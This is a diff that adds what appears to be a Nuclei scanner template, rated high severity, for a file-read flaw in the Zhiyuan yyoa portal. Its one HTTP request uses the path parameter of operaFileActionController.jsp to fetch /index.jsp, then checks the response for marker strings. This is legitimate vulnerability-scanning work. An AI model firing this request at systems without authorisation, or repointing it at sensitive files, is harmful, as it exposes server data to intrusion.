@@ -1,0 +1,19 @@
+id: zhiyuan-operafileactioncontroller-fileread
+
+info:
+  name: zhiyuan-operafileactioncontroller-fileread
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains_all(body, 'WebTransportUtil','UserFileType')"
